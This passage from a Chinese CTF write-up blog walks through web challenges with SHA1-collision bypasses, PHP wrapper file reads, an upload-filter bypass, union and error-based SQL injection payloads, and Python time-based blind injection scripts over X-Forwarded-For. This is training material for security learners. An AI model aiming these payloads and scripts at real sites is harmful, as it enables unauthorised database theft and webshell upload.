class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); </span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; </span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) </span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;; </span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) </span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag); </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>先解释一下代码，当<code>uname`</code>passwd<code>存在，并且两个值不能相等，但是他们俩的</code>sha1<code>值必须相等，原则上是不可能实现的，所以漏洞就在这产生了，这题看到了</code>sha1()<code>，跟</code>md5()`不一样，所以需要<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">SHA1碰撞</a>，我引用了这篇文章的两个hax</p><p>第一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure></p><p>第二个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure></p><p>有了这两个值之后就很好做了，代码本身并不难，记得最后跟上一个<code>id=margin</code></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/30485545.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>题目也是给了代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line">if ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先解释一下代码，<code>extract()</code>可以将数组的<code>键名</code>拆成<code>变量</code>，这里直接像平时一样传参即可，<br>并且必须存在<code>$ac</code>这个变量，然后<code>$f</code>这个变量是从<code>file_get_contents($fn)</code>中得到，所以你还需要传入<code>$fn</code>这个变量，如果<code>$ac</code>与<code>$f</code>相等的话，得到flag，但是这个相等绕过的可能性不大，<br>因为是三个等号，所以只能将另这两个值相等了。</p><p>两种解法：</p><ul><li>第一种</li></ul><p>直接扫后台，扫到一个名为<code>flag.txt</code>，并且内容是<code>flags</code><br>然后根据代码的意思将传入的<code>$ac</code>参数值置为<code>flags</code>,然后将<code>$fn</code>置为<code>flag.txt</code></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</span><br></pre></td></tr></table></figure></p><ul><li>第二种</li></ul><p>利用伪协议，既然<code>$fn</code>可控的话，并且被包含，那么就能用伪协议了，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=1&amp;fn=php://input</span><br><span class="line"></span><br><span class="line">POST:1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/51244785.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>首先这题啥都没有，各种找都找不到入口，然后上御剑扫到了<code>robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /resusl.php</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/81926972.jpg" alt="" title="" class="">                <p></p>            </figure><p>有个提示是管理员的，提交<code>x</code>为各种值都不行，然后提交为<code>admin</code>有反应了？wtf?</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/72058928.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>首先题目提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is margin,give me a image file not a php</span><br></pre></td></tr></table></figure></p><p>先上传个php试试，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/32810460.jpg" alt="" title="" class="">                <p></p>            </figure><p>直接提示了非法文件，然后我们将<code>扩展名</code>改为<code>jpg</code>试试</p><p>题目会提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You got it!:)</span><br></pre></td></tr></table></figure></p><p>能成功，但是题目没有回显路径或者flag,继续更改文件的类型为<code>image/jpeg</code>,<br>然后回显了路径：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/22121514.jpg" alt="" title="" class="">                <p></p>            </figure><p>但是已经被当成一张图片了，服务器无法解析，所以上菜刀是连不上的，<br>这个时候需要揣摩一下出题者的意图了，<br>提示里写了需要一个<code>image</code>，所以类型是肯定需要改成<code>image</code>的，<br>但是各种试都上传不上去，能成功上传的都被更改了后缀名,<br>所以更改一下<code>请求头</code>的<code>Content-Type</code>大小写，因为这道题的waf很严格，<br>导致了各种上传方式都失败，又因为对s上传的文件类型做了一点要求，<br>所以只能更改<code>后缀名</code>来得到flag，php别名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php2, php3, php4, php5, phps, pht, phtm, phtml …</span><br></pre></td></tr></table></figure></p><p>都可以试一下，当试到<code>php5</code>时，得到flag:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/95684881.jpg" alt="" title="" class="">                <p></p>            </figure><p>这里引用网上wp的一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果是waf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，</span><br><span class="line">使得需要上传的文件可以到达服务器端，而服务器的容错率较高，</span><br><span class="line">一般我们上传的文件可以解析。</span><br></pre></td></tr></table></figure></p><h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>题目提示：<br>不如写个python吧。。<br>估计大概率是盲注了，先放上代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></p><p>分析一下代码，这段代码的意思先从<code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR</code>获得ip变量，<br>然后再执行<code>insert into</code>语句，所以这里的可控变量是$ip，也就是在请求包里构造<code>XFF</code>，<br>在<code>insert into注入</code>中，需要用到的sql语句是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when 条件 then 执行1 else 执行2</span><br></pre></td></tr></table></figure></p><p>再来看看代码过滤了什么:<br><code>explode(&#39;,&#39;, $ip)</code>可以发现逗号被过滤了，所以<code>substr()1,1</code>这样的方法行不通，<br>所以现在需要换一种方法<code>substr() from 1 for 1</code>,而且因为没有报错，所以只能是基于时间的盲注，<br>这时候需要用到<code>sleep()</code>和<code>timeout</code>,先上python代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select database() ) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,10):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(&apos;The database name is &apos;+flag)</span><br></pre></td></tr></table></figure></p><p>这段代码的作用是查出来数据库的名字，后面的步骤也就跟普通的盲注一样了，<br>得到表名代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select table_name from information_schema.tables where table_schema= &apos;web15&apos; limit 1 offset &#123;0&#125;) from &#123;1&#125; for 1)=&apos;&#123;2&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">tables = []</span><br><span class="line">for x in range(0,5):</span><br><span class="line">tables.append(flag)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(x),str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(&apos;The database name is &apos;+&apos;&apos;.join(tables))</span><br></pre></td></tr></table></figure></p><p>列名也是一样的道理，所以只放出最后的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,35):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=4)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><p>最后可以得到flag</p><h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>很基础的注入题，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select flag1,2 from flag1 #</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/46039219.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>首先各种试了之后全是<code>error</code>，在这样尝试之后发现没有报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;  aandnd 1=1 %23</span><br></pre></td></tr></table></figure></p><p>估计后面全是双写绕过，然后就变成了一个很普通的<code>联合注入</code>，所以最终的payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,flag1 from flag1%23</span><br></pre></td></tr></table></figure></p><p>但是这个flag是一串乱码。。是第一个flag，在找列的时候还看到一个<code>address列</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,address from flag1%23</span><br></pre></td></tr></table></figure></p><p>可以得到下一关的通关地址<code>Once_More.php</code></p><p>这一关双写union也没办法绕过，所以试了一下<code>updatexml</code>，报错注入，<br>这里大概简述一下updatexml报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure></p><p>来看看这题的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure></p><p><code>concat</code>函数会把中间的参数连接成字符串，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(hello,world,!)</span><br></pre></td></tr></table></figure></p><p>很容易理解，返回的是<code>helloworld!</code>，<br>然后又因为<code>UPDATEXML</code>函数的第二个参数需要的是xml格式的字符串，<br>我这里提交的是<code>~sql语句~</code>,是不符合xml格式的，所以会报错。<br>得到表名：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/47831981.jpg" alt="" title="" class="">                <p></p>            </figure><p>按照这个思路，可以一步步的得到flag，什么时候能进行报错注入呢，输入这个语句查询sql版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)%23</span><br></pre></td></tr></table></figure></p><p>前面已经得到了表名，列名和数据直接放上payload:<br>列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x666c616732),0x7e),1)%23</span><br></pre></td></tr></table></figure></p><p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p><p>然后发现其实这题还有第三关:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/78045830.jpg" alt="" title="" class="">                <p></p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Have_Fun.php</span><br></pre></td></tr></table></figure><p>访问之后查看源代码提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YOUR IP:59.46.211.135</span><br><span class="line">Sorry,Only IP:192.168.0.100 Can Access This Site</span><br></pre></td></tr></table></figure></p><p>构造XFF即可绕过：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/81875175.jpg" alt="" title="" class="">                <p></p>            </figure><p>然后题目提示了一个图片，访问之后是个二维码<br>扫描之后得到以下信息：</p><p>你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#<em>ad…</em>@#！*&amp;@…c……</p><p>参数名是<code>game</code>，flag在admin里，很明显的文件读取了，不能直接读取,<br>所以只能用伪协议了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game=php://filter/read=convert.base64-encode/resource=admin.php</span><br></pre></td></tr></table></figure></p><p>得到源码之后,base64解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$good = &quot;Good Jobï¼I want You!&quot;;</span><br><span class="line">$flag = &quot;0x476F6F64204A6F62A3A1492077616E7420596F7521A3A1&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>得到flag,<br>提交时需要加上FLAG{}</p><h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这题一开始没给加密后的数据，应该是题目有问题，网上找了一下找到了，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure></p><p>加密算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">    $key = md5(&apos;ISCC&apos;);</span><br><span class="line">    $x = 0;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123; </span><br><span class="line">        if ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>自用的解密算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function decrypt($str)&#123;</span><br><span class="line">    $str = base64_decode($str);</span><br><span class="line">    $len = strlen($str);</span><br><span class="line">    $key = md5(&apos;ISCC&apos;);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123; </span><br><span class="line">        if ($x == $klen)&#123;</span><br><span class="line">            $x = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i=0; $i&lt;$len ; $i++) &#123;        </span><br><span class="line">        if (abs(ord($str[$i])-ord($char[$i])+128)&gt;128) &#123;</span><br><span class="line">        $flag .= chr(abs(ord($str[$i])-ord($char[$i])));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        $flag .= chr(abs(ord($str[$i])-ord($char[$i])+128));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有两个地方需要注意，</p><ul><li>第一个是加密算法里的<code>$char</code>，长度不确定，但是想一想之后会发现，他的长度跟加密后的数据长度一样(base64之后)</li><li>第二个点是取余是不可逆的，但是由于ascii码的范围是有限的，所以其中的<code>ord($data[$i]) + ord($char[$i])</code>的范围是[0,254]，所以这个取余是可逆的，分成两种情况，<ul><li>第一种是相加大于128</li><li>第二种是相加小于128</li></ul></li></ul><p>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</p><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>这题应该是坏了，自己试的方法和网上找的方法都行不通</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>首先这个login点了肯定是没反应的，因为根本没有<code>action</code>，<br>所以看到hint,在URL后面传递一个hint参数，此时可以看到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/flagphp/?hint=</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line">$cookie = $_COOKIE[&apos;ISecer&apos;]; </span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span 